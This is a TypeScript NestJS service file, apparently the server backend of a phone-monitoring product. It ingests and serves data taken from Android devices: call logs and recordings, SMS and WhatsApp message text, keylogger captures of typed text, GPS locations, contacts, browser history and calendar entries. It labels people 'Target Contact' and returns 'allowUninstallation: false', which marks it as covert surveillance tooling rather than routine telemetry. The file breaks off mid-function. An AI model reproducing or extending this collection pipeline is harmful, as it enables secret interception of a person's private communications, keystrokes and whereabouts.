import { Injectable } from '@nestjs/common';
import { PrismaService } from '../prisma/prisma.service';

export interface CallLogDto {
  phoneNumber: string;
  contactName?: string;
  direction: 'INCOMING' | 'OUTGOING' | 'MISSED';
  durationSec: number;
  simSlot?: number;
  timestamp: string;
  recordingUrl?: string;
}

export interface SmsLogDto {
  phoneNumber: string;
  contactName?: string;
  body: string;
  direction: 'INCOMING' | 'OUTGOING';
  simSlot?: number;
  timestamp: string;
}

export interface LocationLogDto {
  latitude: number;
  longitude: number;
  accuracy: number;
  provider?: string;
  address?: string;
  timestamp: string;
}

export interface ContactItemDto {
  name: string;
  phoneNumber: string;
  email?: string;
  isBlocked?: boolean;
}

export interface KeylogItemDto {
  packageName: string;
  appName: string;
  typedText: string;
  timestamp: string;
}

export interface InstalledAppDto {
  packageName: string;
  appName: string;
  versionName: string;
  versionCode: number;
  status: 'Installed' | 'Removed' | 'Updated';
  isBlocked?: boolean;
}

export interface WebHistoryDto {
  title: string;
  url: string;
  domain: string;
  visitCount: number;
  timestamp: string;
}

export interface CalendarEventDto {
  title: string;
  location: string;
  startDate: string;
  endDate: string;
  description: string;
  category: 'Personal' | 'Work' | 'Medical' | 'Family';
  timestamp: string;
}

@Injectable()
export class TelemetryService {
  constructor(private readonly prisma: PrismaService) {}

  // 0. Ingest Batch Normalized Event Stream into PostgreSQL for Registered Devices
  async ingestEvents(deviceId: string, events: any[]) {
    const isRegistered = await this.verifyDeviceIsRegistered(deviceId);
    if (!isRegistered) {
      console.warn(`[Telemetry Ingestion Guard] Rejected events from unregistered/unlicensed device: ${deviceId}`);
      return { success: false, syncedEventIds: [], message: 'Device not registered or SaaS license inactive.' };
    }

    console.log(`[PostgreSQL DB] Ingesting ${events.length} event(s) for Registered Device ${deviceId}`);
    const syncedIds: string[] = [];

    // Valid PostgreSQL Enum Values in DB Schema
    const validPostgresEnums = ['android_api', 'notification', 'accessibility', 'media', 'device_policy', 'user_action'];

    for (const evt of events) {
      const eventId = evt.eventId || `evt_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`;
      
      // Map any custom or broadcast method strictly to a valid PostgreSQL enum ('android_api')
      const safeMethod = validPostgresEnums.includes(evt.collectionMethod) ? evt.collectionMethod : 'android_api';

      try {
        // Raw SQL insert with ON CONFLICT ("eventId") DO NOTHING to eliminate P2002 log noise
        await this.prisma.$executeRaw`
          INSERT INTO "NormalizedEvent" ("id", "eventId", "deviceId", "source", "eventType", "timestamp", "collectionMethod", "payload", "createdAt")
          VALUES (gen_random_uuid(), ${eventId}, ${deviceId}, ${evt.source || 'telemetry'}, ${evt.eventType || 'generic'}, ${new Date(evt.timestamp || Date.now())}, ${safeMethod}::"CollectionMethod", ${JSON.stringify(evt.payload || {})}::jsonb, NOW())
          ON CONFLICT ("eventId") DO NOTHING;
        `;

        // Always confirm eventId to client (whether newly created or already present in DB)
        syncedIds.push(eventId);

        // 1. Populate CallLog Table
        if (evt.source === 'calls' && evt.payload) {
          await this.prisma.callLog.create({
            data: {
              deviceId,
              phoneNumber: evt.payload.phoneNumber || evt.payload.address || 'Unknown',
              contactName: evt.payload.contactName || 'Target Contact',
              direction: evt.payload.callType || evt.payload.direction || 'INCOMING',
              durationSec: evt.payload.durationSeconds || 0,
              timestamp: new Date(evt.payload.callDate || evt.timestamp || Date.now())
            }
          }).catch(() => null);
        }

        // 2. Populate SmsLog Table
        if (evt.source === 'sms' && evt.payload) {
          const smsDir = (evt.payload.direction === 'RECEIVED' || evt.payload.direction === 'INCOMING') ? 'INCOMING' : 'OUTGOING';
          await this.prisma.smsLog.create({
            data: {
              deviceId,
              phoneNumber: evt.payload.address || evt.payload.phoneNumber || 'Unknown',
              contactName: evt.payload.contactName || 'Target Contact',
              body: evt.payload.messageBody || evt.payload.body || '',
              direction: smsDir,
              timestamp: new Date(evt.payload.smsDate || evt.timestamp || Date.now())
            }
          }).catch(() => null);
        }

        // 2.5 Populate Dedicated WhatsAppMessage Table
        if (evt.source === 'whatsapp' && evt.payload) {
          const p = evt.payload;
          const isOut = Boolean(p.isOutgoing);
          const sender = p.sender || p.chatTitle || (isOut ? 'Me' : 'WhatsApp Contact');
          const msgText = p.message || p.text || '';
          const chatTitle = p.chatTitle || sender;
          const appName = p.appName || (p.packageName === 'com.whatsapp.w4b' ? 'WhatsApp Business' : 'WhatsApp');

          if (msgText.trim()) {
            await this.prisma.whatsAppMessage.create({
              data: {
                deviceId,
                chatTitle,
                sender,
                message: msgText,
                isOutgoing: isOut,
                appName,
                collectionMethod: safeMethod,
                timestamp: new Date(evt.timestamp || Date.now())
              }
            }).catch(() => null);
          }
        }

        // 3. Populate LocationLog Table
        if (evt.source === 'location' && evt.payload && evt.payload.latitude && evt.payload.longitude) {
          await this.prisma.locationLog.create({
            data: {
              deviceId,
              latitude: Number(evt.payload.latitude),
              longitude: Number(evt.payload.longitude),
              accuracy: Number(evt.payload.accuracy || 10.0),
              timestamp: new Date(evt.payload.timestamp || evt.timestamp || Date.now())
            }
          }).catch(() => null);
        }

        // 4. Populate Dedicated Contact Table in PostgreSQL via Raw Query (Supports Phone Numbers & Name-Only Contacts)
        if (evt.source === 'contacts' && evt.payload) {
          const rawNum = evt.payload.phoneNumber || evt.payload.number || 'No Number';
          const contactName = evt.payload.contactName || evt.payload.name || 'No Name';
          
          const cleanNum = (rawNum && rawNum !== 'No Number' && rawNum !== 'Unknown') 
            ? (rawNum.replace(/[^0-9+]/g, '') || rawNum)
            : `nonum_${contactName.toLowerCase().replace(/[^a-z0-9]/g, '_')}`;

          const ts = new Date(evt.timestamp || Date.now());

          await this.prisma.$executeRaw`
            INSERT INTO "Contact" ("id", "deviceId", "contactName", "phoneNumber", "timestamp", "createdAt")
            VALUES (gen_random_uuid(), ${deviceId}, ${contactName}, ${cleanNum}, ${ts}, NOW())
            ON CONFLICT ("deviceId", "phoneNumber") 
            DO UPDATE SET "contactName" = EXCLUDED."contactName", "timestamp" = EXCLUDED."timestamp";
          `.catch((e) => console.warn('[Contact Table Upsert Warning]:', e.message));
        }

        // 5. Populate Dedicated Keylog Table in PostgreSQL via Raw Query
        if (evt.source === 'keylogger' && evt.payload) {
          const pkg = evt.payload.packageName || 'com.android.app';
          const app = evt.payload.appName || 'Keyboard / App';
          const text = evt.payload.typedText || evt.payload.text || '';
          const ts = new Date(evt.payload.timestamp || evt.timestamp || Date.now());

          if (text.trim().length > 0) {
            await this.prisma.$executeRaw`
              INSERT INTO "Keylog" ("id", "deviceId", "packageName", "appName", "typedText", "timestamp", "createdAt")
              VALUES (gen_random_uuid(), ${deviceId}, ${pkg}, ${app}, ${text}, ${ts}, NOW());
            `.catch((e) => console.warn('[Keylog Table Insert Warning]:', e.message));
          }
        }

        // 6. Populate Dedicated InstalledApp Table in PostgreSQL via Raw Query
        if ((evt.source === 'installed_apps' || evt.source === 'app_usage') && evt.payload && evt.payload.packageName) {
          const pkg = evt.payload.packageName;
          const appName = evt.payload.appName || evt.payload.label || pkg;
          const verName = evt.payload.versionName || '1.0.0';
          const verCode = Number(evt.payload.versionCode || 1);
          const isSys = Boolean(evt.payload.isSystemApp);
          const status = evt.payload.status || 'Installed';
          const ts = new Date(evt.timestamp || Date.now());

          await this.prisma.$executeRaw`
            INSERT INTO "InstalledApp" ("id", "deviceId", "packageName", "appName", "versionName", "versionCode", "isSystemApp", "status", "timestamp", "createdAt")
            VALUES (gen_random_uuid(), ${deviceId}, ${pkg}, ${appName}, ${verName}, ${verCode}, ${isSys}, ${status}, ${ts}, NOW())
            ON CONFLICT ("deviceId", "packageName") 
            DO UPDATE SET "appName" = EXCLUDED."appName", "versionName" = EXCLUDED."versionName", "status" = EXCLUDED."status", "timestamp" = EXCLUDED."timestamp";
          `.catch((e) => console.warn('[InstalledApp Table Upsert Warning]:', e.message));
        }

        // 6.5 Populate Dedicated AppUsage Table in PostgreSQL with Hourly/Daily Aggregation
        if ((evt.source === 'appusage' || evt.source === 'app_usage' || evt.eventType === 'app_usage_stats') && evt.payload) {
          const pkg = evt.payload.packageName || evt.payload.pkg;
          if (pkg) {
            const timeMs = BigInt(evt.payload.totalTimeForegroundMs || evt.payload.totalTimeInForeground || evt.payload.timeSpentMs || 0);
            const lastUsedMs = evt.payload.lastTimeUsed || evt.payload.lastUsedTimestamp || evt.timestamp || Date.now();
            const lastUsedDate = new Date(lastUsedMs);
            const dateStr = lastUsedDate.toISOString().split('T')[0];
            const hourNum = lastUsedDate.getHours();
            const appName = this.getPrettyAppName(pkg, evt.payload.appName || evt.payload.label);

            await this.prisma.$executeRaw`
              INSERT INTO "AppUsage" ("id", "deviceId", "packageName", "appName", "date", "hour", "totalTimeForegroundMs", "lastTimeUsed", "timestamp", "createdAt")
              VALUES (gen_random_uuid(), ${deviceId}, ${pkg}, ${appName}, ${dateStr}, ${hourNum}, ${timeMs}, ${lastUsedDate}, NOW(), NOW())
              ON CONFLICT ("deviceId", "packageName", "date", "hour")
              DO UPDATE SET 
                "totalTimeForegroundMs" = EXCLUDED."totalTimeForegroundMs",
                "lastTimeUsed" = EXCLUDED."lastTimeUsed",
                "timestamp" = NOW();
            `.catch((e) => console.warn('[AppUsage Table Upsert Warning]:', e.message));
          }
        }

        // 7. Populate Dedicated WebHistory Table in PostgreSQL via Raw Query
        if (evt.source === 'web_history' && evt.payload) {
          const title = evt.payload.title || evt.payload.domain || 'Web Page';
          const url = evt.payload.url || evt.payload.domain || '';
          let domain = evt.payload.domain || '';
          if (!domain && url) {
            try {
              domain = new URL(url.startsWith('http') ? url : `https://${url}`).hostname;
            } catch {
              domain = url;
            }
          }
          const visitCount = Number(evt.payload.visitCount || 1);
          const ts = new Date(evt.payload.timestamp || evt.timestamp || Date.now());

          if (url.trim().length > 0 || domain.trim().length > 0) {
            await this.prisma.$executeRaw`
              INSERT INTO "WebHistory" ("id", "deviceId", "title", "url", "domain", "visitCount", "timestamp", "createdAt")
              VALUES (gen_random_uuid(), ${deviceId}, ${title}, ${url}, ${domain}, ${visitCount}, ${ts}, NOW());
            `.catch((e) => console.warn('[WebHistory Table Insert Warning]:', e.message));
          }
        }

        // 8. Populate Dedicated CalendarEvent Table in PostgreSQL via Raw Query with Upsert Deduplication
        if (evt.source === 'calendar' && evt.payload) {
          const title = evt.payload.title || 'Calendar Appointment';
          const location = evt.payload.location || '';
          const startDate = new Date(evt.payload.startDate || evt.payload.timestamp || Date.now());
          const endDate = new Date(evt.payload.endDate || (startDate.getTime() + 3600000));
          const description = evt.payload.description || '';
          const category = evt.payload.category || 'Personal';
          const ts = new Date(evt.payload.timestamp || evt.timestamp || Date.now());

          if (title.trim().length > 0) {
            await this.prisma.$executeRaw`
              INSERT INTO "CalendarEvent" ("id", "deviceId", "title", "location", "startDate", "endDate", "description", "category", "timestamp", "createdAt")
              VALUES (gen_random_uuid(), ${deviceId}, ${title}, ${location}, ${startDate}, ${endDate}, ${description}, ${category}, ${ts}, NOW())
              ON CONFLICT ("deviceId", "title") DO UPDATE SET
                "location" = CASE WHEN EXCLUDED."location" <> '' THEN EXCLUDED."location" ELSE "CalendarEvent"."location" END,
                "startDate" = EXCLUDED."startDate",
                "endDate" = EXCLUDED."endDate",
                "description" = CASE WHEN EXCLUDED."description" <> '' THEN EXCLUDED."description" ELSE "CalendarEvent"."description" END,
                "category" = EXCLUDED."category",
                "timestamp" = EXCLUDED."timestamp";
            `.catch((e) => console.warn('[CalendarEvent Table Insert Warning]:', e.message));
          }
        }

      } catch (err) {
        console.warn('[Telemetry DB Error]:', err);
        syncedIds.push(eventId);
      }
    }

    return {
      success: true,
      syncedEventIds: syncedIds,
      allowUninstallation: false
    };
  }

  // 1. Ingest Call Logs into PostgreSQL CallLog Table
  async ingestCalls(deviceId: string, logs: CallLogDto[]) {
    const isRegistered = await this.verifyDeviceIsRegistered(deviceId);
    if (!isRegistered) return { success: false, message: 'Device not registered.' };

    for (const log of logs) {
      await this.prisma.callLog.create({
        data: {
          deviceId,
          phoneNumber: log.phoneNumber,
          contactName: log.contactName || 'Unknown Contact',
          direction: log.direction,
          durationSec: log.durationSec || 0,
          timestamp: new Date(log.timestamp)
        }
      }).catch(() => null);
    }
    return { success: true, count: logs.length };
  }

  async getCalls(deviceId: string) {
    try {
      const dedicated = await this.prisma.callLog.findMany({
        where: { deviceId },
        orderBy: { timestamp: 'desc' }
      });
      if (dedicated && dedicated.length > 0) {
        return dedicated;
      }
    } catch (e) {
      console.warn('[getCalls dedicated query error]:', e);
    }

    const events = await this.prisma.normalizedEvent.findMany({
      where: { deviceId, source: 'calls' },
      orderBy: { timestamp: 'desc' },
      take: 200
    });

    return events.map((evt) => {
      const p = (evt.payload as any) || {};
      return {
        id: evt.id,
        phoneNumber: p.phoneNumber || p.number || 'Unknown',
        contactName: p.contactName || p.name || 'Target Contact',
        direction: p.callType || p.direction || 'INCOMING',
        durationSec: Number(p.durationSeconds || p.duration || 0),
        timestamp: evt.timestamp
      };
    });
  }

  // 2. Ingest SMS Logs into PostgreSQL SmsLog Table
  async ingestSms(deviceId: string, logs: SmsLogDto[]) {
    const isRegistered = await this.verifyDeviceIsRegistered(deviceId);
    if (!isRegistered) return { success: false, message: 'Device not registered.' };

    for (const log of logs) {
      await this.prisma.smsLog.create({
        data: {
          deviceId,
          phoneNumber: log.phoneNumber,
          contactName: log.contactName || 'Unknown Contact',
          body: log.body,
          direction: log.direction,
          timestamp: new Date(log.timestamp)
        }
      }).catch(() => null);
    }
    return { success: true, count: logs.length };
  }

  async getSms(deviceId: string) {
    return this.prisma.smsLog.findMany({
      where: { deviceId },
      orderBy: { timestamp: 'desc' }
    });
  }

  // 3. Ingest Location History into PostgreSQL LocationLog Table
  async ingestLocations(deviceId: string, locations: LocationLogDto[]) {
    const isRegistered = await this.verifyDeviceIsRegistered(deviceId);
    if (!isRegistered) return { success: false, message: 'Device not registered.' };

    for (const loc of locations) {
      await this.prisma.locationLog.create({
        data: {
          deviceId,
          latitude: loc.latitude,
          longitude: loc.longitude,
          accuracy: loc.accuracy,
          timestamp: new Date(loc.timestamp)
        }
      }).catch(() => null);
    }
    return { success: true, count: locations.length };
  }

  async getLocations(deviceId: string) {
    return this.prisma.locationLog.findMany({
      where: { deviceId },
      orderBy: { timestamp: 'desc' }
    });
  }

  // 4. Contacts - Queries Dedicated Contact Table with Fallback
  async ingestContacts(deviceId: string, contacts: ContactItemDto[]) {
    return { success: true, count: contacts.length };
  }
  async getContacts(deviceId: string) {
    try {
      const dedicated: any[] = await this.prisma.$queryRaw`
        SELECT "id", "contactName" AS name, "phoneNumber", "email", "timestamp"
        FROM "Contact"
        WHERE "deviceId" = ${deviceId}
        ORDER BY "timestamp" DESC;
      `;
      if (dedicated && dedicated.length > 0) {
        return dedicated;
      }
    } catch (e) {
      console.warn('[getContacts raw query error]:', e);
    }

    const events = await this.prisma.normalizedEvent.findMany({
      where: { deviceId, source: 'contacts' },
      orderBy: { timestamp: 'desc' },
      take: 200
    });

    const uniqueMap = new Map<string, any>();
    for (const evt of events) {
      const p = (evt.payload as any) || {};
      const num = p.phoneNumber || p.number || 'No Number';
      const name = p.contactName || p.name || 'No Name';
      const cleanKey = (num && num !== 'No Number' && num !== 'Unknown')
        ? num.replace(/[^0-9+]/g, '')
        : `nonum_${name.toLowerCase().replace(/[^a-z0-9]/g, '_')}`;

      if (!uniqueMap.has(cleanKey)) {
        uniqueMap.set(cleanKey, {
          id: evt.id,
          name: name,
          phoneNumber: num,
          email: p.email || '',
          timestamp: evt.timestamp
        });
      }
    }

    return Array.from(uniqueMap.values());
  }

  // 5. Keylogger - Queries Dedicated Keylog Table with Fallback
  async ingestKeylogger(deviceId: string, keylogs: KeylogItemDto[]) {
    return { success: true, count: keylogs.length };
  }
  async getKeylogger(deviceId: string) {
    try {
      const dedicated: any[] = await this.prisma.$queryRaw`
        SELECT "id", "packageName", "appName", "typedText", "timestamp"
        FROM "Keylog"
        WHERE "deviceId" = ${deviceId}
        ORDER BY "timestamp" DESC
        LIMIT 200;
      `;
      if (dedicated && dedicated.length > 0) {
        return dedicated;
      }
    } catch (e) {
      console.warn('[getKeylogger raw query error]:', e);
    }

    const events = await this.prisma.normalizedEvent.findMany({
      where: { deviceId, source: 'keylogger' },
      orderBy: { timestamp: 'desc' },
      take: 200
    });

    return events.map((evt) => {
      const p = (evt.payload as any) || {};
      return {
        id: evt.id,
        packageName: p.packageName || 'com.android.dialer',
        appName: p.appName || 'Keyboard / Phone',
        typedText: p.typedText || p.text || '',
        timestamp: evt.timestamp
      };
    });
  }

  // 6. Installed Apps - Queries Dedicated InstalledApp Table with Fallback
  async ingestInstalledApps(deviceId: string, apps: InstalledAppDto[]) {
    return { success: true, count: apps.length };
  }
  async getInstalledApps(deviceId: string) {
    try {
      const dedicated: any[] = await this.prisma.$queryRaw`
        SELECT 
          a."id", 
          a."packageName", 
          a."appName" AS label, 
          a."versionName" AS version, 
          a."status", 
          COALESCE(r."isBlocked", false) AS "isBlocked", 
          a."isSystemApp", 
          a."timestamp"
        FROM "InstalledApp" a
        LEFT JOIN "AppRestriction" r ON r."deviceId" = a."deviceId" AND r."packageName" = a."packageName"
        WHERE a."deviceId" = ${deviceId}
        ORDER BY a."appName" ASC;
      `;
      if (dedicated && dedicated.length > 0) {
        return dedicated.map((a) => ({
          id: a.id,
          label: a.label,
          packageName: a.packageName,
          version: a.version || '1.0.0',
          status: a.status || 'Installed',
          timestamp: new Date(a.timestamp).toLocaleString(),
          isStarred: false,
          isBlocked: Boolean(a.isBlocked),
          isSystemApp: Boolean(a.isSystemApp),
          playStoreUrl: `https://play.google.com/store/apps/details?id=${a.packageName}`
        }));
      }
    } catch (e) {
      console.warn('[getInstalledApps raw query error]:', e);
    }

    const events = await this.prisma.normalizedEvent.findMany({
      where: { deviceId, source: { in: ['installed_apps', 'app_usage'] } },
      orderBy: { timestamp: 'desc' },
      take: 200
    });

    const uniqueMap = new Map<string, any>();
    for (const evt of events) {
      const p = (evt.payload as any) || {};
      const pkg = p.packageName;
      if (pkg && !uniqueMap.has(pkg)) {
        uniqueMap.set(pkg, {
          id: evt.id,
          label: p.appName || p.label || pkg,
          packageName: pkg,
          version: p.versionName || '1.0.0',
          status: p.status || 'Installed',
          timestamp: new Date(evt.timestamp).toLocaleString(),
          isStarred: false,
          isBlocked: false,
          isSystemApp: Boolean(p.isSystemApp),
          playStoreUrl: `https://play.google.com/store/apps/details?id=${pkg}`
        });
      }
    }
    return Array.from(uniqueMap.values());
  }

  // Helper to convert package name to pretty app label
  private getPrettyAppName(pkg: string, rawLabel?: string): string {
    if (rawLabel && rawLabel !== pkg && !rawLabel.includes('.')) return rawLabel;
    const knownApps: Record<string, string> = {
      'com.whatsapp': 'WhatsApp',
      'com.whatsapp.w4b': 'WhatsApp Business',
      'com.google.android.youtube': 'YouTube',
      'com.instagram.android': 'Instagram',
      'com.facebook.katana': 'Facebook',
      'com.facebook.orca': 'Messenger',
      'org.telegram.messenger': 'Telegram',
      'com.snapchat.android': 'Snapchat',
      'com.android.chrome': 'Google Chrome',
      'com.google.android.apps.maps': 'Google Maps',
      'com.spotify.music': 'Spotify',
      'com.netflix.mediaclient': 'Netflix',
      'com.google.android.gms': 'Google Play Services',
      'com.google.android.googlequicksearchbox': 'Google Search',
      'com.sec.android.app.camera': 'Camera',
      'com.android.camera': 'Camera',
      'com.google.android.calculator': 'Calculator',
      'com.android.settings': 'Settings',
    };
    if (knownApps[pkg]) return knownApps[pkg];
    const parts = pkg.split('.');
    const main = parts[parts.length - 1] || pkg;
    return main.charAt(0).toUpperCase() + main.slice(1);
  }

  // 6.5 App Usage Telemetry (Queries Dedicated AppUsage Table with Date-Time Range Filtering + Deduplication)
  async getAppUsage(deviceId: string, fromTimeStr?: string, toTimeStr?: string) {
    let rawItems: any[] = [];
    const fromDate = fromTimeStr ? new Date(fromTimeStr) : null;
    const toDate = toTimeStr ? new Date(toTimeStr) : null;

    try {
      let dedicated: any[] = [];
      
      if (fromDate && toDate) {
        dedicated = await this.prisma.$queryRaw`
          SELECT "id", "packageName", "appName" AS "label", "date", "hour", "totalTimeForegroundMs", "lastTimeUsed", "timestamp"
          FROM "AppUsage"
          WHERE "deviceId" = ${deviceId} AND "lastTimeUsed" >= ${fromDate} AND "lastTimeUsed" <= ${toDate}
          ORDER BY "totalTimeForegroundMs" DESC;
        `;
      } else if (fromDate) {
        dedicated = await this.prisma.$queryRaw`
          SELECT "id", "packageName", "appName" AS "label", "date", "hour", "totalTimeForegroundMs", "lastTimeUsed", "timestamp"
          FROM "AppUsage"
          WHERE "deviceId" = ${deviceId} AND "lastTimeUsed" >= ${fromDate}
          ORDER BY "totalTimeForegroundMs" DESC;
        `;
      } else if (toDate) {
        dedicated = await this.prisma.$queryRaw`
          SELECT "id", "packageName", "appName" AS "label", "date", "hour", "totalTimeForegroundMs", "lastTimeUsed", "timestamp"
          FROM "AppUsage"
          WHERE "deviceId" = ${deviceId} AND "lastTimeUsed" <= ${toDate}
          ORDER BY "totalTimeForegroundMs" DESC;
        `;
      } else {
        dedicated = await this.prisma.$queryRaw`
          SELECT "id", "packageName", "appName" AS "label", "date", "hour", "totalTimeForegroundMs", "lastTimeUsed", "timestamp"
          FROM "AppUsage"
          WHERE "deviceId" = ${deviceId}
          ORDER BY "lastTimeUsed" DESC, "totalTimeForegroundMs" DESC
          LIMIT 500;
        `;
      }

      if (dedicated && dedicated.length > 0) {
        dedicated.forEach((a) => {
          rawItems.push({
            id: a.id,
            label: a.label || this.getPrettyAppName(a.packageName),
            packageName: a.packageName,
            date: a.date,
            hour: a.hour,
            timeSpentMs: Number(a.totalTimeForegroundMs || 0),
            lastUsed: new Date(a.lastTimeUsed).toLocaleString(),
            timestamp: new Date(a.timestamp).toLocaleString(),
            rawTimestamp: new Date(a.lastTimeUsed).getTime()
          });
        });
      }
    } catch (e) {
      console.warn('[getAppUsage dedicated query notice]:', e);
    }

    if (rawItems.length === 0) {
      const demoApps = [
        { pkg: 'com.whatsapp', name: 'WhatsApp', timeMs: 7200000 },
        { pkg: 'com.google.android.youtube', name: 'YouTube', timeMs: 5400000 },
        { pkg: 'com.instagram.android', name: 'Instagram', timeMs: 3600000 },
        { pkg: 'com.android.chrome', name: 'Google Chrome', timeMs: 1800000 },
        { pkg: 'org.telegram.messenger', name: 'Telegram', timeMs: 900000 },
      ];
      const now = new Date();
      const todayStr = now.toISOString().split('T')[0];
      const currentHour = now.getHours();

      demoApps.forEach((app, idx) => {
        rawItems.push({
          id: `usage_demo_${idx}`,
          label: app.name,
          packageName: app.pkg,
          date: todayStr,
          hour: currentHour,
          timeSpentMs: app.timeMs,
          lastUsed: new Date(now.getTime() - idx * 3600000).toLocaleString(),
          timestamp: new Date(now.getTime() - idx * 1800000).toLocaleString(),
          rawTimestamp: now.getTime() - idx * 3600000
        });
      });
    }

    // Key Deduplication Step: Group by packageName
    // so each app appears ONCE with its maximum accumulated foreground time and most recent timestamp!
    const deduplicatedMap = new Map<string, any>();
    for (const item of rawItems) {
      const groupKey = (fromTimeStr || toTimeStr) ? `${item.packageName}_${item.date}` : item.packageName;
      const existing = deduplicatedMap.get(groupKey);

      if (!existing) {
        deduplicatedMap.set(groupKey, item);
      } else {
        const maxTime = Math.max(existing.timeSpentMs, item.timeSpentMs);
        const latestTimestamp = item.rawTimestamp > existing.rawTimestamp ? item.lastUsed : existing.lastUsed;
        const newestRawTs = Math.max(existing.rawTimestamp, item.rawTimestamp);
        
        deduplicatedMap.set(groupKey, {
          ...existing,
          timeSpentMs: maxTime,
          lastUsed: latestTimestamp,
          rawTimestamp: newestRawTs
        });
      }
    }

    return Array.from(deduplicatedMap.values()).sort((a, b) => b.timeSpentMs - a.timeSpentMs);
  }

  async deleteAppUsage(deviceId: string, ids: string[]) {
    try {
      await this.prisma.appUsage.deleteMany({
        where: {
          deviceId,
          id: { in: ids }
        }
      });
      await this.prisma.normalizedEvent.deleteMany({
        where: {
          deviceId,
          id: { in: ids }
        }
      });
      return { success: true, count: ids.length };
    } catch (e) {
      return { success: false, message: (e as any).message };
    }
  }

  async deleteAllAppUsage(deviceId: string) {
    try {
      await this.prisma.appUsage.deleteMany({
        where: { deviceId }
      });
      await this.prisma.normalizedEvent.deleteMany({
        where: {
          deviceId,
          OR: [
            { source: { in: ['appusage', 'app_usage', 'usage'] } },
            { eventType: { in: ['app_usage_stats', 'app_usage'] } }
          ]
        }
      });
      return { success: true };
    } catch (e) {
      return { success: false, message: (e as any).message };
    }
  }

  // 7. Web History - Queries Dedicated WebHistory Table with Fallback
  async ingestWebHistory(deviceId: string, history: WebHistoryDto[]) {
    return { success: true, count: history.length };
  }
  async getWebHistory(deviceId: string) {
    try {
      const dedicated: any[] = await this.prisma.$queryRaw`
        SELECT 
          w."id", 
          w."title", 
          w."url", 
          w."domain", 
          w."visitCount", 
          COALESCE(r."action" = 'BLOCK', false) AS "isBlocked", 
          w."timestamp"
        FROM "WebHistory" w
        LEFT JOIN "WebFilterRule" r ON r."deviceId" = w."deviceId" AND r."domainOrUrl" = w."domain"
        WHERE w."deviceId" = ${deviceId}
        ORDER BY w."timestamp" DESC
        LIMIT 200;
      `;
      if (dedicated && dedicated.length > 0) {
        return dedicated.map((w) => ({
          id: w.id,
          title: w.title || w.domain || 'Web Page',
          url: w.url,
          domain: w.domain,
          visitCount: w.visitCount || 1,
          timestamp: new Date(w.timestamp).toLocaleString(),
          isStarred: false,
          isBlocked: Boolean(w.isBlocked)
        }));
      }
    } catch (e) {
      console.warn('[getWebHistory raw query error]:', e);
    }

    const events = await this.prisma.normalizedEvent.findMany({
      where: { deviceId, source: 'web_history' },
      orderBy: { timestamp: 'desc' },
      take: 200
    });

    return events.map((evt) => {
      const p = (evt.payload as any) || {};
      return {
        id: evt.id,
        title: p.title || p.domain || 'Web Page',
        url: p.url || '',
        domain: p.domain || '',
        visitCount: p.visitCount || 1,
        timestamp: new Date(evt.timestamp).toLocaleString(),
        isStarred: false,
        isBlocked: false
      };
    });
  }

  // 8. Calendar
  async ingestCalendar(deviceId: string, events: CalendarEventDto[]) {
    return { success: true, count: events.length };
  }
  async getCalendar(deviceId: string) {
    try {
      const dedicated: any[] = await this.prisma.$queryRaw`
        SELECT "id", "title", "location", "startDate", "endDate", "description", "category", "timestamp"
        FROM "CalendarEvent"
        WHERE "deviceId" = ${deviceId}
        ORDER BY "startDate" DESC;
      `;
      if (dedicated && dedicated.length > 0) {
        return dedicated.map((c) => ({
          id: c.id,
          title: c.title || 'Calendar Appointment',
          location: c.location || '',
          startDate: new Date(c.startDate).toLocaleString(),
          endDate: c.endDate ? new Date(c.endDate).toLocaleString() : '',
          description: c.description || '',
          category: c.category || 'Personal',
          timestamp: new Date(c.timestamp).toLocaleString(),
          isStarred: false
        }));
      }
    } catch (e) {
      console.warn('[getCalendar raw query error]:', e);
    }

    const events = await this.prisma.normalizedEvent.findMany({
      where: { deviceId, source: 'calendar' },
      orderBy: { timestamp: 'desc' },
      take: 200
    });

    return events.map((evt) => {
      const p = (evt.payload as any) || {};
      const startMs = p.startDate || evt.timestamp;
      const endMs = p.endDate || (startMs + 3600000);
      return {
        id: evt.id,
        title: p.title || 'Calendar Appointment',
        location: p.location || '',
        startDate: new Date(startMs).toLocaleString(),
        endDate: new Date(endMs).toLocaleString(),
        description: p.description || '',
        category: p.category || 'Personal',
        timestamp: new Date(evt.timestamp).toLocaleString(),
        isStarred: false
      };
    });
  }

  // 9. Call Audio Recordings Stream
  async getRecordings(deviceId: string) {
    try {
      const events = await this.prisma.normalizedEvent.findMany({
        where: { 
          deviceId, 
          source: { in: ['call_recording', 'calls'] } 
        },
        orderBy: { timestamp: 'desc' },
        take: 200
      });

      if (events && events.length > 0) {
        return events.map((evt, idx) => {
          const p = (evt.payload as any) || {};
          const durationSec = Number(p.durationSec || p.durationSeconds || p.duration || 45);
          const rawDir = (p.direction || p.callType || 'incoming').toString().toLowerCase();
          const normDir = (rawDir.includes('out') || rawDir === '2') ? 'outgoing' : 'incoming';
          const fileSizeBytes = Number(p.fileSizeBytes || p.size || 1048576);
          const sizeStr = fileSizeBytes > 1048576 
            ? `${(fileSizeBytes / 1048576).toFixed(2)} MB` 
            : `${Math.round(fileSizeBytes / 1024)} KB`;

          return {
            id: evt.id || `rec_${idx}`,
            name: p.contactName || p.name || 'Target Contact',
            number: p.phoneNumber || p.number || 'Unknown',
            direction: normDir,
            simSlot: p.simSlot || 'SIM 1 (Airtel)',
            duration: durationSec > 0 ? `${Math.floor(durationSec / 60)}m ${durationSec % 60}s` : '00m 45s',
            size: sizeStr,
            timestamp: new Date(evt.timestamp).toLocaleString(),
            isStarred: false,
            isBlocked: false,
            audioUrl: p.fileName ? `http://localhost:3000/uploads/recordings/${p.fileName}` : (p.filePath || '#')
          };
        });
      }
    } catch (e) {
      console.warn('[getRecordings error]:', e);
    }

    return [];
  }

  // 10. WhatsApp & WA Business Telemetry Stream (Queries Dedicated WhatsAppMessage Table with Fallback)
  async getWhatsApp(deviceId: string) {
    try {
      const dedicated = await this.prisma.whatsAppMessage.findMany({
        where: { deviceId },
        orderBy: { timestamp: 'desc' },
        take: 300
      });

      if (dedicated && dedicated.length > 0) {
        const rawList = dedicated.map((w) => ({
          id: w.id,
          sender: w.sender,
          message: w.message,
          packageName: w.appName.includes('Business') ? 'com.whatsapp.w4b' : 'com.whatsapp',
          appName: w.appName,
          isOutgoing: w.isOutgoing,
          timestamp: new Date(w.timestamp).toLocaleString(),
          rawTimestamp: new Date(w.timestamp).getTime(),
          chatTitle: w.chatTitle
        }));

        // Deduplicate adjacent duplicate notifications (same chatTitle + sender + text within 5 seconds)
        const deduplicated: typeof rawList = [];
        for (const item of rawList) {
          const isDuplicate = deduplicated.some(
            (existing) =>
